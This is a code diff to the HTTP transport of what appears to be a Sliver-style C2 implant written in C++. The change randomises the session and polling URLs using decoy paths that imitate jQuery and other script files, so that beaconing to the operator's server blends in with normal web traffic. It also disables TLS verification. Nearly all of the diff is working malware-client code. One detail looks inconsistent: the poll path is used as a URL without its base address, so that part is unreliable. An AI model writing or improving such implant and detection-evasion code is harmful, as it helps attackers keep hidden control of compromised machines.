@@ -1,5 +1,3 @@
-
-
 #include "Client.h"
 #include "CryptoUtils.h"
 #include "base64_utils.h"
@@ -8,7 +6,7 @@
 #include <cpr/cpr.h>
 #include "my_time.h"
 #include "constants.h"
-
+#include <numeric>
 using namespace std::chrono_literals;
 
 namespace transports {
@@ -39,6 +37,115 @@ namespace transports {
 		this->hostHeader = hostHeader;
 		this->timeDelta = std::chrono::system_clock::duration(0);
 	}
+
+	string HttpClient::StartSessionURL() {
+		auto s = SessionURL();
+		return s.replace(s.find(".php"), 4, ".html");
+	}
+
+	string HttpClient::SessionURL() {
+#ifdef DEBUG
+		std::vector<string>segments = {
+			// 
+			"upload",
+			// 
+			"actions",
+			// 
+		};
+		std::vector<string>filenames = {
+			// 
+			"api",
+			// 
+			"samples",
+			// 
+		};
+#else
+		std::vector<string>segments = {
+			// {{range .HTTPC2ImplantConfig.SessionPaths}}
+			"{{.}}",
+			// {{end}}
+		};
+		std::vector<string>filenames = {
+			// {{range .HTTPC2ImplantConfig.SessionFiles}}
+			"{{.}}",
+			// {{end}}
+		};
+#endif
+		auto elems = RandomPath(segments, filenames, "php");
+		auto ret = std::accumulate(
+			std::next(elems.begin()),
+			elems.end(),
+			elems[0],
+			[](std::string a, std::string b) {
+				return a + "/" + b;
+			}
+		);
+		return this->base_URI + "/" + ret;
+	}
+
+	string HttpClient::PollURL() {
+#ifdef DEBUG
+		std::vector<string>segments = {
+			// 
+			"script",
+			// 
+			"javascripts",
+			// 
+			"javascript",
+			// 
+			"jscript",
+			// 
+			"js",
+			// 
+			"umd",
+			// 
+		};
+		std::vector<string>filenames = {
+			// 
+			"jquery.min",
+			// 
+			"jquery",
+			// 
+		};
+
+#else
+		std::vector<string>segments = {
+			// {{range .HTTPC2ImplantConfig.PollPaths}}
+			"{{.}}",
+			// {{end}}
+		};
+		std::vector<string>filenames = {
+			// {{range .HTTPC2ImplantConfig.PollFiles}}
+			"{{.}}",
+			// {{end}}
+		};
+#endif
+		auto elems = RandomPath(segments, filenames, "php");
+		auto ret = std::accumulate(
+			std::next(elems.begin()),
+			elems.end(),
+			elems[0],
+			[](std::string a, std::string b) {
+				return a + "/" + b;
+			}
+		);
+		return ret;
+	}
+
+	std::vector<string> HttpClient::RandomPath(std::vector<string>& segments, std::vector<string>& filenames, string extension) {
+		std::vector<string> genSegments;
+		if (0 < segments.size()){
+			auto n = rand() % segments.size();
+			for (int i = 0;i < n;i++) {
+				auto s = segments[rand() % segments.size()];
+				genSegments.push_back(s);
+			}
+		}
+		auto filename = filenames[rand() % filenames.size()];
+		filename.append(string{ "." } + extension);
+		genSegments.push_back(filename);
+		return genSegments;
+	}
 bool HttpClient::SessionInit() {
 		auto key = crypto::RandomKey();
 		auto server_pbk = crypto::GetServerECCPublicKey();
@@ -57,11 +164,11 @@ bool HttpClient::SessionInit() {
 
 		auto now_utc = toUTC(std::chrono::system_clock::now());
 		auto totp = crypto::GetTOTP(now_utc+this->timeDelta);		
-		//TODO modify path generation with random mechanism
-		auto path = string("/authenticate/rpc.html") + string("?n=") + to_string(nonce) + string("&op=") + to_string(totp);
-		auto URI = this->base_URI + path;
+
+		auto URI = this->StartSessionURL();
+
 		session->SetVerifySsl(cpr::VerifySsl{ false });
-		session->SetUrl(cpr::Url{ this->base_URI + path });
+		session->SetUrl(cpr::Url{ URI + string("?n=") + to_string(nonce) + string("&op=") + to_string(totp) });
 		session->SetBody(cpr::Body{ encoded });
 		cpr::Response resp = session->Post();
 		if (resp.status_code == 0) {
@@ -94,9 +201,9 @@ bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::En
 	auto nonce = std::get<0>(tp);
 
 	auto encoded = encoder->Encode(reqData);
-	string path{ "/db/admin.php" };
+	auto URI = this->SessionURL();
 	this->pollMutex.lock();
-	this->session->SetUrl(cpr::Url{ this->base_URI + path });
+	this->session->SetUrl(cpr::Url{ URI });
 	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
 	this->session->SetBody(encoded);
 	auto resp = this->session->Post();
@@ -126,9 +233,11 @@ bool HttpClient::WriteEnvelope(sliverpb::Envelope& envelope) {
 	auto nonce = std::get<0>(tp);
 
 	auto encoded = encoder->Encode(reqData);
-	string path{ "/db/admin.php" };
+
+	auto URI = this->SessionURL();
+
 	this->pollMutex.lock();
-	this->session->SetUrl(cpr::Url{ this->base_URI + path });
+	this->session->SetUrl(cpr::Url{ URI });
 	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
 	this->session->SetBody(encoded);
 	auto resp = this->session->Post();
@@ -159,13 +268,14 @@ unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope() {
 	if (this->sessionID.compare("") == 0) {
 		return nullptr;
 	}
-	string path{ "/jscript/bootstrap.js" };
+
+	auto URI = this->PollURL();
 
 	auto tp = encoders::GetRandomEncoder();
 	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
 	auto nonce = std::get<0>(tp);
 	this->pollMutex.lock();
-	this->session->SetUrl(cpr::Url{ this->base_URI + path });
+	this->session->SetUrl(cpr::Url{ URI });
 	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
 	auto resp = this->session->Get();
 	this->pollMutex.unlock();
